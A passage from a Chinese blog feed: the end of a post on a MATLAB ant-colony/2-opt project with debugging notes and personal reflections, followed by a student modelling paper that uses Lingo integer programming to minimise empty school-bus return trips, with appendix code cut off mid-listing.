id="关于2-opt算法"><a href="#关于2-opt算法" class="headerlink" title="关于2-opt算法"></a>关于2-opt算法</h4><p>参考资料：<a href="https://blog.csdn.net/qq_33256688/article/details/75642525">https://blog.csdn.net/qq_33256688/article/details/75642525</a> （用2-opt求解TSP旅行商问题）</p><h4 id="遇到的bug与学到的小知识"><a href="#遇到的bug与学到的小知识" class="headerlink" title="遇到的bug与学到的小知识"></a>遇到的bug与学到的小知识</h4><ul><li><p>matlab中sc(1:end-1)中end表示矩阵sc中的最后一项</p></li><li><p>报错：未定义函数或变量</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210518235434050.png" alt="image-20210518235434050"></p><p> 图中明明有punishs但是还说我未定义，期间一度怀疑matlab坏了，后来找到bug，还是得多相信机器。。。人脑子不是一直靠谱的。</p><p>matlab中有符号变量和数值变量，符号变量使用sym或者syms定义，数值变量直接赋值如a=1即可自动定义，这里的punishs按理说有punishs=0直接定义，但是经过本项目中2-opt随机翻转序列的算法之后，可能不满足产生punishs=0的if判断条件，导致punishs这个数值变量未定义而直接运行punishs=punishs+1这行，实际上punishs+1的这个punishs未定义，故报错。解决方案：让if条件很满足并且对系统的影响最小，n这个全局变量是卡车数量n=3，所有的卡车都是从1号站点即控制中心发出，所以原本的路径初始完全满足if条件，在使用2-opt算法时，随机翻转过程中可能产生了左边缘为1的随机数，导致第一个站点不为1，从而挑出了if条件，所以只要将随机数产生范围从2开始就好了。</p></li><li><p>当求矩阵中最大值位置的时候用find函数，如a=[4,0,1,3,2,4]，find(a==max(a))  ,ans=1    6</p></li><li><p>matlab中数组的翻转函数fliplr,flipud。这里用在2-opt中实现倒置其中一定范围内的元素顺序</p></li></ul><hr><hr><h3 id="说点别的"><a href="#说点别的" class="headerlink" title="说点别的"></a>说点别的</h3><ul><li>蚁群算法，蜂群算法，遗传算法……这些受大自然启发的作品果然十分巧妙，果然大自然才是nbplus++，说它是取之不竭用之不尽的灵感源泉一点也不过分。</li><li>我比较关心的一个问题就是：现实中能有多少人能从自然界汲取灵感并将之转化利用？</li><li>就上面的问题谈谈我的感想。<ul><li>首先，万事万物，自然界都有它的一套表达方式，人类使用的工具——数学，应该是目前为止最好的诠释工具了，数学带来的美，就像是纯音乐给人的感觉，是一种美感，如何定义这个“美”，我不知道，我可以用“巧妙”，”协调”来表达这种feeling。一些几何图像，似乎能引起生命的共振。</li><li>其次，有了数学这个工具，还得用物理的思想来尝试理解自然，这里的物理泛指万物之理，由此引申出生物学，化学等自然学科，甚至当研究对象是人类的时候所产生的心理学，经济学，社会学，哲学，历史学，政治学等学问。这里先谈自然界的。马克思主义唯物论认为：实践出真知。而我认为：先有实践还是先有认识，这是一个先有鸡还是先有蛋的问题，我们这里假设先有实践后有认知，那么观察这个世界，就是一种认知的获取方式，理解这个世界，宏观上是获取认知，微观上我更愿意称之为神经单元之间的群体行为，是一种微观的实践，二者是相对而言的。物理的本质是尝试对万事万物进行建模，是一种仿真模拟，期间的一切理论，似乎可以理解为公设，只是这个假设是最被认可的，与自然界最接近的（理论物理）。</li><li>愚蠢的人类试图战胜自然，如果把“战胜’’解释为：全部理解自然并能造出第二个地球，以我目前的认知来看，很多人穷极一生都不可能，因为信息量实在是太大了，很多人穷极一生只能扮演这个微缩宇宙中的一种角色。也许，这就是我越来越觉得自己是个废物的原因了。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> AI算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> Matlab </tag>
            
            <tag> 蚁群算法 </tag>
            
            <tag> K-means聚类 </tag>
            
            <tag> 2-opt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于整数规划的最优校车空返运输方案</title>
      <link href="2023/03/30/AI%E7%AE%97%E6%B3%95/%E5%9F%BA%E4%BA%8E%E6%95%B4%E6%95%B0%E8%A7%84%E5%88%92%E7%9A%84%E6%A0%A1%E8%BD%A6%E7%A9%BA%E8%BF%94%E6%9C%80%E4%BD%B3%E6%96%B9%E6%A1%88/"/>
      <url>2023/03/30/AI%E7%AE%97%E6%B3%95/%E5%9F%BA%E4%BA%8E%E6%95%B4%E6%95%B0%E8%A7%84%E5%88%92%E7%9A%84%E6%A0%A1%E8%BD%A6%E7%A9%BA%E8%BF%94%E6%9C%80%E4%BD%B3%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<h1 id="基于整数规划的最优校车空返运输策略"><a href="#基于整数规划的最优校车空返运输策略" class="headerlink" title="基于整数规划的最优校车空返运输策略"></a>基于整数规划的最优校车空返运输策略</h1><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>本文针对校车空返运输策略问题，通过Lingo编程，对运输过程进行模拟分析，根据约束条件与目标函数建立了整数规划模型，给出了不同条件下的最优校车空返运输的发车方案，完美解决了校车空返问题。</p><p>对于问题一，为了方便观察新校区与老校区之间发车时刻点之间的顺序关系，先用Excel列出校车时刻表。通过观察模拟发现，情况一不存在校车的空返情况，在每一个发车时刻中目标用车辆都可以满足实际用车量的需求。对于情况二，由于情况一的特解具有偶然性，随机性，故采用以一天中总调度车辆空返数量最小为目标函数，以满足用车需求为约束条件整数规划模型来求解使用Lingo编程求解即可得出结果。</p><p>对于问题二，继承了问题一情况二的发车需求情况，决策变量还是每天每个时刻的实际发车辆和周一初始时刻两校区校车数。目标函数变为对于周一至周五的总调度车辆空返数量最小，还是以满足用车需求为约束条件，同样适用Lingo求解模型结果。</p><p>对于问题三，相比问题二来说多了周六周日两天的数据，本质上与问题而的整数规划模型相同，仅需要将目标函数中空返车辆的约束范围从周一至周五扩展至整周即可，同样适用lingo编程求解。</p><p>对于问题四，针对实际车辆调度中每周能持续运行的问题。在问题3的模型中再添加一条约束条件即可，然后同样可以使用lingo进行求解。</p><p>最后，对模型进行了优缺点给出评价，并在此基础上，对模型进行了适当的改进与推广，使模型具有更好的实用性与可靠性。</p><p><strong>关键词**</strong>:**  整数规划  Lingo  校车空返运输  模拟</p><h2 id="一、问题重述"><a href="#一、问题重述" class="headerlink" title="一、问题重述"></a>一、问题重述</h2><p><strong>问题背景</strong></p><p>某学校每天有教职工从老校区乘车到新校区工作，工作后大多数人会返回。后勤集团每天会安排车辆在新老校区之间往返运行。但某些时段新老校区需要乘车的人数不均衡，如早上主要是老校区的教职工乘车到新校区，中午和下午下班时主要是教职工从老校区返回新校区。由于车辆有限，有时候为了满足当前校区车辆的需求，需要从另一校区调度空车返回（称为空返）。如何使空返的车辆数尽量少是后勤集团十分关心的问题。</p><p><strong>该校班车运行时刻表如下：</strong> </p><p><strong>一、周一至周五</strong></p><p>1.老校区到新校区</p><p>7:00、8:00、9:20、10:00、11:00、12:00、12:50、14:00、14:50、16:00、17:00、17:50、21:00、22:30。</p><p>2.新校区到老校区</p><p>9:00、10:30、11:00、12:30、14:00、15:00、16:00、17:10、18:00、19:00、21:00、22:30。</p><p><strong>二、周六、周日</strong></p><p><strong>1.</strong> <strong>老校区到新校区</strong></p><p>8:00、9:20、12:50、14:00、18:00、20:00。</p><p><strong>2.</strong> <strong>新校区到老校区</strong></p><p>9:00、11:00、12:30、17:00、18:00、21:00。</p><p>  车辆在两校区运行时间时间为一个小时左右。为简化起见，假设每辆车从一个校区到另一个校区的时间都为一个小时。由于两校区不同时刻对车辆的需求不平衡，当某个校区需要的车辆数多，现有车辆不能满足需求，这时需要从另一个校区调度空车返回。空车可以在现有发车时刻表中某一时刻发车，也可以在需要的时候提前一个小时发车。</p><p>  该校总共有车辆20辆，每辆可载客人47人。请你建立数学模型仔细考虑下面问题。</p><p><strong>要解决的问题</strong></p><p><strong>问题1****：</strong>若某天（周一到周五）老校区到新校区需要的车辆数为7,6,4,3,1,1,4,3,1,2,1,2,1,1（对应14个发车时刻需要的车辆数）。新校区到老校区需要的车辆数为2,3,2,6, 2,1,7,6,4,2,1,1。问能否实现车辆不空载，若能实现，给出车辆安排方式；若一定会出现空载，那么如何安排可使空返车辆数最少？若老校区到新校区需要车辆数为9,8,4,3,1,1,4,3,1,2,1,2,1,1，新校区到老校区需要的车辆数为3,4,2,6, 2,1,7,8, 4,2,1,1，情况又如何？要求给出初始两校区车辆数，当天停止运行后两校区车辆数，总的空返车辆数。 </p><p><strong>问题2****：</strong>如果保持每天连续运行，每天老校区各班次需要车辆数仍为9,8,4,3,1,1,4,3,1,2,1,2,1,1；新校区各班次需要的车辆仍为3,4,2,6, 2,1,7,8, 4,2,1,1，问如何安排可使一周（周一到周五）空返车辆数总数最少？要求给出周一初始两校区车辆数，周五停止运行后两校区车辆数，总的空返车辆数。</p><p><strong>问题3****：</strong>若周六老校区各班次需要车辆数为：5,4,6,4,3,2；新校区为：3,5,7,6,2,1。周日老校区各班次需要车辆数为：5,4,4,6,3,7；新校区为：2,6,5,3,3,1。考虑周一到周日共7天，如何安排使空返车辆数最少？要求给出周一初始两校区车辆数，周日停止运行后两校区车辆数，总的空返车辆数。</p><p><strong>问题4****：</strong>在实际车辆调度中，希望每周能持续运行。在问题3的要求下，若再要求周日停止运行后两校区的车辆数与周一初始两校区车辆数相同，如何安排使空返车辆数最少？要求给出周一初始两校区车辆数或周日停止运行后两校区车辆数，总的空返车辆数。</p><p><strong>注：</strong>以上所有问题的车辆安排计划可选择部分放入论文，完整的安排计划可放附录。</p><h2 id="二、问题分析"><a href="#二、问题分析" class="headerlink" title="二、问题分析"></a>二、问题分析</h2><h3 id="2-1、问题一的分析"><a href="#2-1、问题一的分析" class="headerlink" title="2.1、问题一的分析"></a>2.1、问题一的分析</h3><p>对于问题一，为了更加方便观察新校区与老校区之间发车时刻点之间的顺序关系，使用Excel列出校车时刻表。发现情况一的7点到10点期间，若要满足在目标发车条件，则20辆校车一开始必须都在老校区的特殊情况，利用这个线索可以求出新校区的初始停车情况为0辆，然后再根据校车时刻表进行模拟进一步验证，情况一这种情况下，不存在校车的空返情况，因为经过模拟发现，在每一个发车时刻中目标用车辆都可以满足实际用车量的需求。</p><p>​    对于情况二，由于情况一的特解具有偶然性，随机性，通过理解题意发现，本质上是一个以<strong>一天中总调度车辆空返数量最小为目标函数</strong>，以<strong>满足用车需求为约束条件</strong>的<strong>整数规划</strong>问题，接着使用Lingo求解即可得出结果。</p><h3 id="2-2、问题二的分析"><a href="#2-2、问题二的分析" class="headerlink" title="2.2、问题二的分析"></a>2.2、问题二的分析</h3><p>对于问题二，继承了问题一情况二的发车需求情况，决策变量还是每天每个时刻的实际发车辆和周一初始时刻两校区校车数。<strong>目标函数变为对于周一至周五的总调度车辆空返数量最小，还是以满足用车需求为约束条件。</strong>同样适用Lingo求解模型结果。</p><h3 id="2-3、问题三的分析"><a href="#2-3、问题三的分析" class="headerlink" title="2.3、问题三的分析"></a>2.3、问题三的分析</h3><p>对于问题三， 相比于问题二来说多了周六周日两天的数据，本质上与问题而的整数规划模型相同，仅需要将目标函数中空返车辆的约束范围从周一至周五扩展至整周即可，对于lingo代码，需要添加周末的数据，做少许修改即可求出。</p><h3 id="2-4、问题四的分析"><a href="#2-4、问题四的分析" class="headerlink" title="2.4、问题四的分析"></a>2.4、问题四的分析</h3><p>对于问题四，在实际车辆调度中，希望每周能持续运行。在问题3的要求下，若要求周日停止运行后两校区的车辆数与周一初始两校区车辆数相同，这意味着再添加一条约束条件即周末结束后的车辆与周一开始的时候两个校区的车辆相同，据此，整数规划模型整体几乎不变，只需要添加一条约束即可，然后同样可以使用lingo进行求解。</p><h2 id="三、模型假设"><a href="#三、模型假设" class="headerlink" title="三、模型假设"></a>三、模型假设</h2><p>1、假设校车仅供教职工乘坐，不提供给学生或其他人乘坐服务；</p><p>2、 假设校车在新老校区之间来回为1小时，不考虑道路堵车等影响到达时间情况；</p><p>3、假设所有教职工当天都必须乘坐校车返回自己原来的校区；</p><p>4、假设校车在上客时不能发车。如10:00刚到新校区，在有教职工上车时，该辆车不能10:00准时从新校区发车；</p><p>5、假设一天的校车开始运营时刻与运营结束时刻，所有校车必然在两个校区其一，不在路上，即校车不运作时停在老校区或者新校区其一，不会停在别的地方；</p><h2 id="四、符号说明"><a href="#四、符号说明" class="headerlink" title="四、符号说明"></a>四、符号说明</h2><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210620100725493.png" alt="image-20210620100725493"></p><h2 id="五、模型的建立与求解"><a href="#五、模型的建立与求解" class="headerlink" title="五、模型的建立与求解"></a>五、模型的建立与求解</h2><h2 id="5-1、问题一模型建立及求解"><a href="#5-1、问题一模型建立及求解" class="headerlink" title="5.1、问题一模型建立及求解"></a>5.1、问题一模型建立及求解</h2><h3 id="5-1-1、数据处理"><a href="#5-1-1、数据处理" class="headerlink" title="5.1.1、数据处理"></a>5.1.1、数据处理</h3><p>为了更好地观察校车发车时刻之间的关系，针对两个校区发车时刻情况，首先列出时刻表如图1所示</p><p> <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210620100746142.png" alt="image-20210620100746142"></p><p>图 1  校车时刻表</p><h3 id="5-1-2、模型建立"><a href="#5-1-2、模型建立" class="headerlink" title="5.1.2、模型建立"></a>5.1.2、模型建立</h3><p><strong>情况一：</strong></p><p>从图一的7点到10点的数据不难看出，在假设4成立的基础上，若要满足从老校区到新校区，从7点到10点都顺利发车，至少需要20辆车，而校车总数为20辆，若要使得在问题一“若某天（周一到周五）老校区到新校区需要的车辆数为7,6,4,3,1,1,4,3,1,2,1,2,1,1（对应14个发车时刻需要的车辆数）。新校区到老校区需要的车辆数为2,3,2,6, 2,1,7,6, 4,2,1,1。”可以按照数目顺利发车，则可以逆推出，早上老校区应该有20辆车，</p><p>即  <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210620100820699.png" alt="image-20210620100820699">，</p><p>即老校区初始校车数量为20辆，对应的初始新校区校车数量为：20-20=0辆。对于一天最开始的时刻来说，基于假设5，校车必然在两个校区中，所以公式为：</p><p>​                               <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210620100837507.png" alt="image-20210620100837507">                              </p><p>当天停止运行后两校区车辆数：</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210620100851633.png" alt="image-20210620100851633"></p><p>即当天停止运行后两校区车辆数，存在一个特解，即老校区为20辆，新校区为0辆。</p><p><strong>根据这里的特殊情况得到的结论，还需要进行推广检验，因为此处只是保证前20<strong><strong>辆车在7</strong></strong>点到10****点是够用的，但是不能排除在后续期间存在从老校区继续向新校区派车，车辆不够用的情况。因此，此处进一步根据校车时刻表进行模拟验证。</strong></p><p>采用模拟法根据校车时刻表可以得出在每一个时刻校车都够用，即不存在需要用车但是没有车可派的情况，所以不存在空返情况。</p><p><strong>定义空返情况：</strong></p><p>为了方便后续讨论，这里进一步明确题目中的“空返”情况，即什么情况下会造成空返。我们约定，像题目中“若某天（周一到周五）老校区到新校区需要的车辆数为7,6,4,3,1,1,4,3,1,2,1,2,1,1（对应14个发车时刻需要的车辆数）。”这种每个时刻需要的车辆数为<strong>目标发车数，</strong>如<strong>target_new</strong>表示从新校区发往老校区的目标发车数。但是现实中存在需要从一个校区到另一个校区用车，但是这个校区已经没有车的情况，这时就需要从另一个校区临时调度或者提前调度一辆空车回来，此时这辆被临时调度的校车就是<strong>空返校车</strong>，而实际上某个时刻需要从某个校区到另一个校区的校车数量定义为<strong>实际需要用车。</strong></p><p>所以，对于某个时刻的空返校车有，空返校车=实际需要用车-目标发车数，即：<img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210620100906619.png" alt="image-20210620100906619"></p><p>​                                                                        </p><p><strong>情况二：</strong></p><p>对于情况一比较容易发现老校区初始车辆数目为20辆，而对于情况二，如果尝试使用同样方法求特解，即：</p><p>  <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210620100921532.png" alt="image-20210620100921532"></p><p>结果发现并不能得到特解，因为从老校区到新校区的第3个发车时刻起，就会面临车不够用的问题，即需要从新校区临时调度车回来，这意味就意味着空载。</p><p>​    问题求解到这，发现其实本质上这是一个线性规划问题，由于校车视为整体不可分割，所以准确地说，这是一个<strong>整数规划问题</strong>。<strong>该规划问题的决策变量为每个发车时刻的实际发车数和初始时刻两校区的校车数</strong>，<strong>目标函数则是空返车数</strong>。结合上面对空返校车的定义，可以知道目标函数实际上就是一天中所有时刻的实际发车数减去目标发车数之和。<strong>其中约束条件有：两个校区的车辆在调度车辆之后一定要满足实际用车需求，为了保证教职工有车可乘，实际用车量等于或者大于计划用车需求，在老校区的初始车辆数量至少需要满足前两个时刻的用车需求，即从老校区到新校区一开始要有车可乘，以及模型中车辆数目均为非负整数。</strong></p><p>​                  <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210620100937369.png" alt="image-20210620100937369"></p><p>至此，已给出解决校车空返调度问题的整数规划问题。</p><h3 id="5-1-3、模型求解"><a href="#5-1-3、模型求解" class="headerlink" title="5.1.3、模型求解"></a>5.1.3、模型求解</h3><p>对于整数规划这类问题的求解，考虑使用Lingo软件，这里使用Lingo18.0进行编程求解。</p><p>其中对于时间数据的处理，需要将时间上的60进制换算成十进制才能代入lingo进行求解，如12:30换算结果为12.5，9:20换算结果为9.3333。对于分钟换算公式可表示为</p><p>小数部分=时刻的分钟部分/60</p><p>换算之后结果作为Lingo参数：</p><p>new_time=9,10.5,11,12.5,14,15,16,17,18,19,21,22.5;</p><p>old_time=7,8,9.3333,10,11,12,12.8333,14,14.8333,16,17,17.8333,21,22.5;</p><p>​    对于情况二模型的求解，</p><p> <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210620100949579.png" alt="image-20210620100949579"></p><p>图 2  Lingo求解得初始校车分布与实际最优发车策略</p><p>在lingo代码中将整数规划模型求解结果输出到Excel中指定位置，得到初始两校区车辆数分别为20辆和0辆，对应时刻表的实际发车策略如图2所示，该方案对应目标函数最优解，即最少需要空载车次，结果如图3所示</p><p> <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210620101020799.png" alt="image-20210620101020799"></p><p>图 3  对于情况二使用lingo的求解结果</p><p>从结果可以看出<strong>最少空返车辆为<strong><strong>5</strong></strong>辆</strong></p><p><strong>各个时刻目标发车与实际发车结果对比：</strong></p><p>老校区——新校区</p><p>目标发车辆：9,8,4,3,1,1,4,3,1,2,1,2,1,1</p><p>实际发车辆：9,8,4,3,1,2,4,5,1,2,1,2,1,1</p><p><strong>12<strong><strong>点和14</strong></strong>点分别需要临时调度1<strong><strong>辆和2</strong></strong>辆车</strong></p><p>新校区——老校区</p><p>目标发车辆：3,4,2,6,2,1,7,8,4,2,1,1</p><p>实际发车辆：5,4,2,6,2,1,7,8,4,2,1,1</p><p><strong>早上7<strong><strong>点需要临时调度2</strong></strong>辆车</strong></p><h2 id="5-2、问题二模型建立及求解"><a href="#5-2、问题二模型建立及求解" class="headerlink" title="5.2、问题二模型建立及求解"></a>5.2、问题二模型建立及求解</h2><h3 id="5-2-1、模型建立"><a href="#5-2-1、模型建立" class="headerlink" title="5.2.1、模型建立"></a>5.2.1、模型建立</h3><p>问题二使用与问题一类似的目标发车方案，故模型的约束条件不变，若使得周一至周五5天的总调度车辆空返数量最少，模型上只需要修改目标函数即可。</p><p>​                              <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210620101043842.png" alt="image-20210620101043842"></p><h3 id="5-2-2、模型求解"><a href="#5-2-2、模型求解" class="headerlink" title="5.2.2、模型求解"></a>5.2.2、模型求解</h3><p>使用lingo18.0求解模型，代码详见附录三。求解得：</p><p> <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210620101112594.png" alt="image-20210620101112594"></p><p>图 4  Lingo求解问题二结果</p><p>从周一到周五，最少空返数为29车次，其中初始车辆如：</p><p> <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210620101122684.png" alt="image-20210620101122684"></p><p>周一初始老校区有20辆车，新校区有0辆，周五运行结束后老校区有19辆车，新校区有1辆车。</p><p><strong>各时刻发车策略</strong></p><p> <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210620101138722.png" alt="image-20210620101138722"></p><h2 id="5-3、问题三模型建立及求解"><a href="#5-3、问题三模型建立及求解" class="headerlink" title="5.3、问题三模型建立及求解"></a>5.3、问题三模型建立及求解</h2><h3 id="5-3-1、模型建立"><a href="#5-3-1、模型建立" class="headerlink" title="5.3.1、模型建立"></a>5.3.1、模型建立</h3><p>对于问题三， 相比于问题二来说多了周六周日两天的数据：</p><p> <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210620101148726.png" alt="image-20210620101148726"></p><p>图 5  周六周日班车时刻表</p><p>但其本质上与问题而的整数规划模型相同，仅需要将目标函数中空返车辆的约束范围从周一至周五扩展至整周即可，即：</p><p>​                               <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210620101203471.png" alt="image-20210620101203471"></p><h3 id="5-3-2、模型求解"><a href="#5-3-2、模型求解" class="headerlink" title="5.3.2、模型求解"></a>5.3.2、模型求解</h3><p>对于lingo代码，需要添加周末的数据，做少许修改即可求出，具体代码见附件四。</p><p> <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210620101217804.png" alt="image-20210620101217804"></p><p>图 6  Lingo求解问题三结果</p><p><strong>发车方案</strong></p><p> <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210620101238261.png" alt="image-20210620101238261"></p><p>周一初始状态，老校区有20辆车，新校区有0辆。周末结束后，老校区有14辆车，新校区有6辆车。</p><h2 id="5-4、问题四模型建立及求解"><a href="#5-4、问题四模型建立及求解" class="headerlink" title="5.4、问题四模型建立及求解"></a>5.4、问题四模型建立及求解</h2><h3 id="5-4-1、模型建立"><a href="#5-4-1、模型建立" class="headerlink" title="5.4.1、模型建立"></a>5.4.1、模型建立</h3><p>针对问题四，只需要在问题三的基础上添加最后一条约束即可，即周一早上的老校区校车数与周日晚上运行结束时老校区的校车数量一致。</p><p>​                           <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210620101256611.png" alt="image-20210620101256611">        </p><h3 id="5-4-2、模型求解"><a href="#5-4-2、模型求解" class="headerlink" title="5.4.2、模型求解"></a>5.4.2、模型求解</h3><p>使用lingo进行编程求解该整数规划模型，结果如下：</p><p> <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210620101312814.png" alt="image-20210620101312814"></p><p>图 7  Lingo求解问题4结果</p><p>在问题四的约束条件下，一周最少空返车次为49次，具体发车方案如下</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210620101341764.png" alt="image-20210620101341764"></p><p>在该约束条件下，周一初始老校区有17辆，新校区有3辆，周日初始老校区有14辆，新校区有6辆，运行后老校区有17辆，新校区有3辆。</p><h2 id="六、模型评价"><a href="#六、模型评价" class="headerlink" title="六、模型评价"></a>六、模型评价</h2><h2 id="6-1、模型的评价"><a href="#6-1、模型的评价" class="headerlink" title="6.1、模型的评价"></a>6.1、模型的评价</h2><h3 id="6-1-1、模型优点"><a href="#6-1-1、模型优点" class="headerlink" title="6.1.1、模型优点"></a>6.1.1、模型优点</h3><p>针对校车空返问题的整数规划模型这里具有普适性，易于推广；</p><p>该模型求得的解为最优解，理论上只要考虑的约束条件足够准确，求得的结果也会变得越来越接近现实世界。</p><h3 id="6-1-2、模型缺点"><a href="#6-1-2、模型缺点" class="headerlink" title="6.1.2、模型缺点"></a>6.1.2、模型缺点</h3><p>对于问题一中的第一种情况，期初使用的是枚举方法，该方法不具有鲁棒性，具有随机性，因此在后续需要对其进行改进。</p><h2 id="七、模型的改进与推广"><a href="#七、模型的改进与推广" class="headerlink" title="七、模型的改进与推广"></a>七、模型的改进与推广</h2><p>对于问题一中的第一种情况，期初使用的是枚举方法，该方法不具有鲁棒性，具有随机性，因此，这里尝试使用解决问题一情况二的整数规划模型来对情况一进行求解。</p><p> <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210620101406432.png" alt="image-20210620101406432"></p><p>图 8  Lingo求解问题一情况一</p><p>该结果显示了空返车辆的目标函数最小值可以取0，这意味着这种情况可以实现0空返，即不需要临时调度车辆，也就是说目标车辆满足了实际需求。该结果也佐证了期初使用具有随机性的枚举方法在解决这个问题上的正确性，同时也作为该问题的一个改进与推广应用。</p><p>另外，该模型解出初始车辆老校区最少为19辆，新校区最多为1辆。给出了另一种新老校区校车初始分布方案。</p><h2 id="八、参考文献"><a href="#八、参考文献" class="headerlink" title="八、参考文献"></a>八、参考文献</h2><p>[1] 司守奎, 数学建模算法与应用, 北京: 国防工业出版社, 2019.</p><p>[2] 姜启源, 数学建模（第五版）, 北京: 高等教育出版社, 2018.</p><p>[3] Frank R.Giordano（美）等著,叶其孝 姜启源等译,数学建模（第五版）,北京:机械工业出版社, 2019.</p><h2 id="九、附录部分"><a href="#九、附录部分" class="headerlink" title="九、附录部分"></a>九、附录部分</h2><h6 id="附录一-使用的软件及代码运行环境"><a href="#附录一-使用的软件及代码运行环境" class="headerlink" title="附录一  : 使用的软件及代码运行环境"></a>附录一  : 使用的软件及代码运行环境</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本文问题的解决主要使用Lingo18.0，在Win10(64 bit)环境中完成代码的编译与运行，结合使用Excel等软件。  </span><br></pre></td></tr></table></figure><h6 id="附录二-问题一Lingo代码"><a href="#附录二-问题一Lingo代码" class="headerlink" title="附录二  : 问题一Lingo代码"></a>附录二  : 问题一Lingo代码</h6><table><thead><tr><th>1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32</th><th>MODEL:  !定义集合;  SETS:  new/1..12/:new_school,new_time,target_new;  !定义新校区发车的12个时刻对象集合,每个对象有定义的3个属性;  old/1..14/:old_school,old_time,target_old;   un/1..11/;  uo/1..13/;  initial/1/:old_init_num;  ENDSETS     DATA:  new_time=9,10.5,11,12.5,14,15,16,17,18,19,21,22.5;  old_time=7,8,9.3333,10,11,12,12.8333,14,14.8333,16,17,17.8333,21,22.5;  !第一种情况;  !target_new=2,3,2,6,2,1,7,6,4,2,1,1;  !target_old=7,6,4,3,1,1,4,3,1,2,1,2,1,1;  !第二种情况;  target_new=3,4,2,6,2,1,7,8,4,2,1,1;  target_old=9,8,4,3,1,1,4,3,1,2,1,2,1,1;     @ole(‘C://Users//Liloker//Desktop//output1_1.xlsx’,’new’)=new_school;  !excel定义名称new，输出new_school变量到其中;  @ole(‘C://Users//Liloker//Desktop//output1_1.xlsx’,’old’)=old_school;  @ole(‘C://Users//Liloker//Desktop//output1_1.xlsx’,’S’)=old_init_num;  ENDDATA     min=@sum(new(i):(new_school(i)-target_new(i)))+@sum(old(i):(old_school(i)-target_old(i)));  !目标函数为空返车数;  @for(initial(i):      old_init_num(i)&gt;=old_school(1)+old_school(2);      old_init_num(i)&gt;=0;      old_init_num(i)&lt;=20; !初始老校区车辆数  );  @for(new(i):      new_school(i)&gt;=target_new(i)  );  @for(old(i):      old_school(i)&gt;=target_old(i)  );  @for(new(i):      @for(uo(j)|(old_time(j)+1)#le#new_time(i) #and#  new_time(i)#lt#(old_time(j+1)+1):             (20-old_init_num(1))+(@sum(old(k)|k#le#j:old_school(k))-@sum(new(k)|k#lt#i:new_school(k)))&gt;=new_school(i)      )  );  @for(old(i)|i#ge#3:      @for(un(j)|(new_time(j)+1)#le#old_time(i) #and# old_time(i)#lt#(new_time(j+1)+1):             old_init_num(1)+(@sum(new(k)|k#le#j:new_school(k))-@sum(old(k)|k#lt#i:old_school(k)))&gt;=old_school(i)      )  );  @for(new(i):      @gin(new_school(i)) !gin限制变量为整数;  );  @for(old(i):      @gin(old_school(i))  );</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><h6 id="附录三-问题二Lingo代码"><a href="#附录三-问题二Lingo代码" class="headerlink" title="附录三  : 问题二Lingo代码"></a>附录三  : 问题二Lingo代码</h6><table><thead><tr><th>1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  36</th><th>MODEL:  !定义集合;  SETS:  new/1..12/:new_time,target_new;  old/1..14/:old_time,target_old;  un/1..11/;  uo/1..13/;  initial/1..5/:old_init_num;  days/1..5/;  dayso/1..4/;  newweek(days,new):new_school;  oldweek(days,old):old_school;  ENDSETS  DATA:  new_time=9,10.5,11,12.5,14,15,16,17,18,19,21,22.5;  old_time=7,8,9.3333,10,11,12,12.8333,14,14.8333,16,17,17.8333,21,22.5;  target_new=3,4,2,6,  2,1,7,8, 4,2,1,1;  target_old=9,8,4,3,1,1,4,3,1,2,1,2,1,1;  @ole(‘C:\Users\Liloker\Desktop\output2.xlsx’,’new’)=new_school;  @ole(‘C:\Users\Liloker\Desktop\output2.xlsx’,’old_d’)=old_school;  @ole(‘C:\Users\Liloker\Desktop\output2.xlsx’,’oi’)=old_init_num;  ENDDATA  min=@sum(newweek(i,j):(new_school(i,j)-target_new(j)))+@sum(oldweek(i,j):(old_school(i,j)-target_old(j)));  @for(initial(i):    old_init_num(i)&gt;=old_school(i,1)+old_school(i,2);    old_init_num(i)&gt;=0;    old_init_num(i)&lt;=20;  );  @for(newweek(i,j):    